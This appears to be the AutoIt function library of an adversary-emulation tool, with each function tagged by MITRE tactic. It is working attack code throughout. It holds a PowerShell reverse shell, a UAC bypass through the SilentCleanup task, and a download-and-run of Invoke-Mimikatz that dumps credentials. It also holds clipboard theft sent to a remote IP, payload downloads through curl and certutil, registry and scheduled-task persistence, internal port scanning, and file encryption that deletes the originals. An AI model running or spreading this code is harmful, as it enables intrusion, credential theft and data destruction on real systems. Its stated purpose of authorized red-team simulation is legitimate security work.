;DISCLAIMER: The APT-SimulActor use requires authorization from proper stakeholders. Author and Contributors will not be responsible for the malfunctioning or weaponization of the tool.

#NoTrayIcon

#include <Inet.au3>
#include <MsgBoxConstants.au3>
#include <FileConstants.au3>
#include <WinAPIFiles.au3>
#include <File.au3>
#include <AutoItConstants.au3>
#include <Crypt.au3>

Global $PSTools_URL = "https://download.sysinternals.com/files/PSTools.zip"
Global $7Zip_URL = "https://www.7-zip.org/a/7za920.zip"

$ErrorHandler = ObjEvent("AutoIt.Error", "ErrFunc") ; Custom error handler

;Error handler
Func ErrFunc()
    $HexNumber = Hex($ErrorHandler.number, 8)
    Return SetError(1, $HexNumber)
 EndFunc

Func init();DESCRIPTION:init;MITRE:-
   If $CmdLine[0] > 0 Then
	  $action = $CmdLine[1]
	  $arg = $CmdLine[2]

	  Dim $szDrive, $szDir, $szFName, $szExt
	  if ($action == "delete_previous") Then
		 if FileExists($arg) Then
			_PathSplit($arg, $szDrive, $szDir, $szFName, $szExt)
			ProcessClose($szFName & $szExt )
			Sleep(2000)
			FileDelete($arg)
		 EndIf
	  EndIf
	  if ($action == "keep_previous") Then
		 if FileExists($arg) Then
			_PathSplit($arg, $szDrive, $szDir, $szFName, $szExt)
			ProcessClose($szFName & $szExt )
			Sleep(2000)
		 EndIf
	  EndIf
   EndIf
EndFunc

Func PauseSeconds($seconds)
   Sleep($seconds * 1000)
   Return 1
EndFunc

Func SetPersistent4CurrentUser();DESCRIPTION:Get the exe persistent for current user;MITRE:Persistence
   ;TODO add check if key already there before write
   RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run", "System", "REG_SZ", @ScriptDir & "\" & @ScriptName)
EndFunc

Func Scheduled($path_exe);DESCRIPTION:Schedule the sample as a task;MITRE:Persistence
   return function_wrapper("schtasks /create /sc minute /mo 1 /tn Calculator /tr " & $path_exe)
EndFunc

Func DeleteScheduled($sample);DESCRIPTION:Remove the sample scheduled as a task;MITRE:Persistence
   return function_wrapper("schtasks /delete /TN" & " " & $sample)
EndFunc

Func MessageBox($text);DESCRIPTION:
   MsgBox($MB_SYSTEMMODAL,StringSplit(@ScriptName, ".")[1], $text)
EndFunc

Func RunElevated($buffer = 'cd..;cd..;dir;Read-Host -Prompt "Press";');DESCRIPTION:Run powershell command with elevated permissions UAC;MITRE:Execution
   $buffer01 = "powershell.exe -Command ";
   $buffer02 = '"Start-Process powershell -Verb runAs ' & "'";
   $buffer00 = $buffer01 & $buffer02 & $buffer & "'" & '"';
   RunWait($buffer00);
EndFunc

Func RunElevatedNoUAC($command = "regedit");DESCRIPTION:Run command with elevated permissions WITHOUT UAC;MITRE:Execution
   $bufferxx='if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {' & $command & ';}'
   $bufferyy='else {$registryPath = "HKCU:\Environment";$Name = "windir";$Value = "powershell -ep bypass -w h $PSCommandPath;#";'
   $bufferzz='Set-ItemProperty -Path $registryPath -Name $name -Value $Value;'
   $buffertt='schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null;Remove-ItemProperty -Path $registryPath -Name $name}'
   $buffer = $bufferxx & $bufferyy & $bufferzz & $buffertt
   $sFileName = @ScriptDir &"\buffer.ps1"
   $hFilehandle = FileOpen($sFileName, $FO_OVERWRITE)
   FileWrite($hFilehandle, $buffer)
   FileClose($hFilehandle)
   $buffer01 = "powershell.exe -noexit ./";
   $buffer00 = $buffer01 & "buffer.ps1"
   RunWait($buffer00);
   Sleep(4 * 1000)
   FileDelete($sFileName)
EndFunc

Func SharedDiscover();DESCRIPTION:Returns stream of data from Shared Resources;MITRE:Collection
   Local $limiter = "----------"
   Local $buffer
   Local $aArray = DriveGetDrive($DT_NETWORK)
   For $i = 1 To $aArray[0]
	  Local $aFileList = _FileListToArray($aArray[$i], "*")
		 For $file = 1 To $aFileList[0]
			if $aFileList[$file] <> "desktop.ini" And $aFileList[$file] <> "My Music" And $aFileList[$file] <> "My Pictures" And $aFileList[$file] <> "My Videos" Then
				  $buffer &= $limiter &@crlf
				  $buffer &= "Filename: " & $aFileList[$file] &@crlf
				  Local $hFileOpen = FileOpen($aArray[$i] & "\\" & $aFileList[$file], $FO_READ)
				  Local $sFileRead = FileRead($hFileOpen)
				  FileClose($hFileOpen)
				  $buffer &= $sFileRead &@crlf
			EndIf
		 Next
		 $buffer &= $limiter &@crlf
	  Next
   Return $buffer
EndFunc

Func clipboard2Log($timeOut = 10, $pathLog = @TempDir & "\keys.dump");DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
   $buffer=""
   While 1
	  if $timeOut > 0 Then
		 $Data = ClipGet()
		 Sleep(1000)
		 if $buffer <> $Data Then
			$buffer = $Data
			Log2File($buffer, $pathLog)
		 EndIf
		 $timeOut=$timeOut-1
	  Else
		 return True
	  EndIf
   WEnd
EndFunc

Func clipboard2Web($ip, $tag, $port = "80", $timeOut = 10);DESCRIPTION:Log to file the data stored in the clipboard;MITRE:Collection
   $buffer=""
   While 1
	  if $timeOut > 0 Then
		 $Data = ClipGet()
		 Sleep(1000)
		 if $buffer <> $Data Then
			$buffer = $Data
			HttpPost($ip, $tag, $port, $buffer)
		 EndIf
		 $timeOut=$timeOut-1
	  Else
		 return True
	  EndIf
   WEnd
EndFunc

Func Log2File($log, $pathFile);DESCRIPTION:Log to file buffer of data;MITRE:Collection
    ;Local Const $sFilePath = _WinAPI_GetTempFileName(@TempDir)
	Local Const $sFilePath = $pathFile
    Local $hFileOpen = FileOpen($sFilePath, $FO_APPEND)
	   If $hFileOpen = -1 Then
		   MsgBox($MB_SYSTEMMODAL, "", "An error occurred whilst writing the temporary file.")
		   Return False
	   EndIf
    FileWrite($hFileOpen, $log & @CRLF)
    FileClose($hFileOpen)
 EndFunc

Func DetectMouseMoving();DESCRIPTION:Detect if mouse is moving;MITRE:Discovery
   Local $MousePos = MouseGetPos()
   Local $hTimer = TimerInit()
   while 1
	  If $MousePos[0] <> MouseGetPos()[0] Then
		 Return 1
	  EndIf
	  if TimerDiff($hTimer) > 5000 Then
		  MsgBox($MB_SYSTEMMODAL, "", ":(")
		 Exit
	  EndIf
   WEnd
EndFunc

Func RandomString();DESCRIPTION:random string generator;MITRE:-
   $out = ""
   Dim $buffer[3]
   $digits = 8
   For $i = 1 To $digits
	   $buffer[0] = Chr(Random(65, 90, 1)) ;A-Z
	   $buffer[1] = Chr(Random(97, 122, 1)) ;a-z
	   $buffer[2] = Chr(Random(48, 57, 1)) ;0-9
	   $out &= $buffer[Random(0, 2, 1)]
   Next
   Return $out & ".exe"
EndFunc

Func isRunningFromFolder($folder);DESCRIPTION:Check if sample is running from Specific Folder;MITRE:Discovery
   if (StringUpper(@ScriptDir) == StringUpper($folder)) Then
	  Return 1
   EndIf
EndFunc

Func changeHASH($filePath)
   Local $hFileOpen = FileOpen($filePath, $FO_APPEND)
   If $hFileOpen = -1 Then
	  Return False
   EndIf
   FileWriteLine($hFileOpen, "1")
   FileClose($hFileOpen)
EndFunc

Func MoveAndRunAgain($folder = "C:\WINDOWS\TEMP", $newName = RandomString())
   if isRunningFromFolder($folder) Then
	  Return 1
   Else
	  FileCopy(@ScriptDir & "\" & @ScriptName, $folder & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
	  changeHASH($folder & "\" & $newName)
	  RunWait($folder & "\" & $newName & " " & "delete_previous" & " " & FileGetShortName(@ScriptDir & "\" & @ScriptName)));
   EndIf
EndFunc

Func CopyAndRunAgain($folder = "C:\WINDOWS\TEMP", $newName = RandomString())
   if isRunningFromFolder($folder) Then
	  Return 1
   Else
	  FileCopy(@ScriptDir & "\" & @ScriptName, $folder & "\" & $newName, $FC_OVERWRITE + $FC_CREATEPATH)
	  changeHASH($folder & "\" & $newName)
	  RunWait($folder & "\" & $newName & " " & "keep_previous" & " " & FileGetShortName(@ScriptDir & "\" & @ScriptName)));
   EndIf
EndFunc

Func administrators();DESCRIPTION:enumerated administrative users;MITRE:Discovery
   return function_wrapper("net localgroup administrators")
EndFunc

Func systeminfo();DESCRIPTION:get sys info;MITRE:Discovery
   return function_wrapper("systeminfo")
EndFunc

Func updates_installed();DESCRIPTION:list of all installed Windows and software updates applied to that computer;MITRE:Discovery
   return function_wrapper("wmic qfe list full")
EndFunc

Func shared();DESCRIPTION:get a list of shared resources;MITRE:Discovery
   Return function_wrapper("wmic share get")
EndFunc

Func searchStringOnRegistry($string);DESCRIPTION:search for string in registry;MITRE:Credential Access
   $bufferPath = @TempDir & "\buffer.tmp"
   $bufferContent = ""
   $result = function_wrapper("reg query HKCU /f """ & $string & """ /t REG_SZ /s")
If (StringLen($result)) > 40 Then
	  Return($result)
   ElseIf Not IsNumber($result) Then
     FileDelete($bufferPath)
	 function_wrapper("reg export hkcu " & $bufferPath)
	 $bufferContent = ReadFile($bufferPath)
     StringReplace($bufferContent,$string,"",1,2)
	  if @extended then
	    FileDelete($bufferPath)
        Return 1
	 Else
		FileDelete($bufferPath)
		Return 0
      EndIf
   EndIf
EndFunc

Func whoami();DESCRIPTION:who am I?;MITRE:Discovery
   $sReturn = function_wrapper("whoami")
   Return StringSplit(StringRegExpReplace(StringUpper($sReturn), '\n|\r', ''),"\")[2];
EndFunc

Func AmIusername($username);DESCRIPTION:Am I username?;MITRE:Discovery
   $sReturn = function_wrapper("whoami")
   $current_user = StringSplit(StringRegExpReplace(StringUpper($sReturn), '\n|\r', ''),"\")[2];
   if StringLower($current_user) == StringLower($username) Then
	  Return 1
   Else
	  Return 0
   EndIf
EndFunc

Func numberOfLogins($user);DESCRIPTION:get number of logins for specific user;MITRE:Defence Evasion
   return StringReplace(StringSplit(function_wrapper("wmic netlogin where (name like '%" & $user & "') get numberoflogons"), @CRLF)[4], " ", "")
EndFunc

Func nslookup($address);DESCRIPTION:run nslookup;MITRE:Discovery
   $sReturn = function_wrapper("nslookup " & $address)
   if StringInStr($sReturn, "NON-EXISTENT") Then
	  return 0
   Else
	  return $sReturn
   EndIf
EndFunc

Func function_wrapper($command);DESCRIPTION:internal function;MITRE:-
   Local $sOutput = ""
   Local $hPid = Run($command, '', @SW_HIDE, $STDERR_MERGED)
   Do
	   Sleep(100)
	   $sOutput &= StdoutRead($hPid)
   Until @error
   ;$sOutput = StringStripWS($sOutput, $STR_STRIPALL) ; remove all @cr and spaces from output
   Return $sOutput
EndFunc

Func DownloadFile($URL, $mode, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:download a file via http;MITRE:Command And Control
	;If Not FileExists($filePath) Then
		if ( $mode == "native" ) Then 
			Local $status = InetGet($URL, $FileName, 1, 1)
				Do
					Sleep(250)
					Until InetGetInfo($status, $INET_DOWNLOADCOMPLETE)
		EndIf
		if ( $mode == "curl" ) Then
			RunWait("curl " & $URL & " --output " & $FileName,"" ,@SW_HIDE)
		EndIf
		if ( $mode == "certutil" ) Then
			RunWait("certutil.exe -urlcache -f " & $URL & " " & $FileName,"" ,@SW_HIDE)
		EndIf
	;EndIf
EndFunc

Func HttpDownloadFile($sURL, $FileName = @TempDir & "\drop.tmp");DESCRIPTION:download a file from an http server;MITRE:Command And Control
   InetGet($sURL, $FileName, 1, 1)
EndFunc

Func CurlDownloader($url, $filePath = @TempDir & "\tools.ext") ;DESCRIPTION:use Curl to download file;MITRE:LateralMovement,CommandAndControl
   ;If Not FileExists($filePath) Then
	  RunWait("curl " & $url & " --output " & $filePath,"" ,@SW_HIDE)
   ;EndIf
EndFunc

Func CertUtilDownloader($url, $filePath = @TempDir & "\tools.ext") ;DESCRIPTION:use Cert Utility to download file;MITRE:LateralMovement,CommandAndControl
   ;If Not FileExists($filePath) Then
	  RunWait("certutil.exe -urlcache -f " & $url & " " & $filePath,"" ,@SW_HIDE)
   ;EndIf
EndFunc

Func PopUp();DESCRIPTION:PopUp using powershell;MITRE:-
   $buffer = "[Reflection.Assembly]::LoadWithPartialName('''System.Windows.Forms''');[Windows.Forms.MessageBox]::show('''Hello World''', '''My PopUp Message Box''')"
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
EndFunc

Func ReverseShell($RemoteIp, $RemotePort);DESCRIPTION:reverse shell using powershell;MITRE:Execution
   $buffer = "$client = [System.Net.Sockets.TCPClient]::new('" & $RemoteIp & "'," & $RemotePort & ");[byte[]]$bytes = (0..65535).ForEach{ 0 };$stream = $client.GetStream();while ($i = $stream.Read($bytes, 0, $bytes.Length)) {$data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);$prompt = $sendback + 'PS ' + $PWD.Path + '> ';$sendbyte = ([System.Text.Encoding]::ASCII).GetBytes($prompt);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()"
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
EndFunc

Func Mimikatz();DESCRIPTION:Mimikatz;MITRE:Credential Access
   $evasion = "EmpireProject/Empire"
   $buffer = "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/" & $evasion & "/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds";
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nop -exec bypass -c " & " " & $buffer);
EndFunc

Func InternetCheck();DESCRIPTION:check if internet is up;MITRE:Discovery
    Local $iPing = Ping("wikipedia.org", 250)
    If $iPing Then
        return 1
    Else
        return 0
    EndIf
 EndFunc

Func ReadRemoteVar($url);DESCRIPTION:read remote http/s page;MITRE:Command and Control
   return _INetGetSource($url) & @crlf
EndFunc

Func TCPscanner($ip,$port);DESCRIPTION:TCP scanner;MITRE:Discovery
   TCPStartup()
   $result = TCPConnect($ip,$port)
   Sleep(1)
   TCPShutdown()
   if $result > 0 Then
	  Return "open"
   Else
	  Return "closed"
   EndIf
EndFunc

Func InternalHostsFinder($port, $start_host, $stop_host)
    $address = StringSplit(@IPAddress1, ".")
    $network = $address[1] & "." & $address[2] & "." & $address[3] & "."
    Local $hostsArray[1]

    For $i = $start_host To $stop_host Step 1
        If Not ($i = $address[4]) Then
            $result = TCPscanner($network & $i, $port)
            If $result = "open" Then
                ReDim $hostsArray[UBound($hostsArray) + 1]
                $hostsArray[UBound($hostsArray) - 1] = $network & $i
            EndIf
        EndIf
    Next

    If UBound($hostsArray) <= 1 Then
        Return False
    Else
        Return $hostsArray
    EndIf
EndFunc

Func HttpPost($ip, $tag, $port = "80", $sData = "");DESCRIPTION:Send data over Http;MITRE:Command and Control
   Local $oHTTP = ObjCreate("WinHttp.WinHttpRequest.5.1")
   $oHTTP.Open("POST", "http://" & $ip & ":" & $port, False)
   $oHTTP.SetRequestHeader("Content-Type", "application/x-www-form-urlencoded")
   $oHTTP.Send($tag & "=" & $sData)
   If @error Then
	  Return "error"
	  Exit
   Else
	  Return($oHTTP.ResponseText)
   EndIf
EndFunc

Func EncryptFiles($password,$folder);DESCRIPTION:Encrypt the files in a directory;MITRE:Post-Adversary Device Access
    $path = _PathFull($folder)
        if FileGetAttrib($path) = "D" Then
            if FileExists($path) Then
                if DirGetSize($path) Then
                    Local $files = _FileListToArray($path, Default, Default, True)
                    For $i = 1 To $files[0]
                        if FileGetAttrib($files[$i]) = "A" Then
                            ConsoleWrite($files[$i] & @CRLF)
                            $result = _Crypt_EncryptFile($files[$i],$files[$i] & ".crypt", $password, $CALG_AES_256)
                            if $result Then
                                FileDelete($files[$i])
                            EndIf
                        EndIf
                    Next
                EndIf
            EndIf
        Else
            ConsoleWrite($path)
            $result = _Crypt_EncryptFile($path,$path & ".crypt", $password, $CALG_AES_256)
                if $result Then
                    FileDelete($path)
                EndIf
        EndIf
 EndFunc

Func DecryptFiles($password,$folder);DESCRIPTION:Decrypt the files in a directory;MITRE:-
  ; List all the files in the directory
	$filePath = _PathFull($folder,@UserProfileDir)
    Local $files = _FileListToArray($filePath, "*")
	For $i = 1 To $files[0]
	   $result = _Crypt_DecryptFile($filePath & "/" & $files[$i],$filePath & "/" & stringtrimright($files[$i], 6 ), $password, $CALG_AES_256)
 	   if $result Then
		 FileDelete($filePath & "/" & $files[$i])
	   EndIf
    Next
 EndFunc

Func ListDesktopFiles();DESCRIPTION:get list of the files in the Desktop;MITRE:Discovery
   local $buffer = ""
   $FileList =_FileListToArray(@DesktopDir)
	  For $i = 1 To $FileList[0]
		 $buffer =  $buffer &  @CRLF & $FileList[$i]
	  Next
   Return $buffer
EndFunc

Func ReadFile($sFilePath);DESCRIPTION:open a file and get content to a variable;MITRE:Discovery
    Local $hFileOpen = FileOpen($sFilePath, $FO_READ)
    If $hFileOpen = -1 Then
        Return False
    EndIf
    Local $sFileRead = FileRead($hFileOpen)
    FileClose($hFileOpen)
	Return $sFileRead
EndFunc

Func Unzip($source,$destination);DESCRIPTION:unzip;MITRE:-
   RunWait("C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Expand-Archive -Force" & " " & $source & " " & $destination, "", @SW_HIDE)
EndFunc
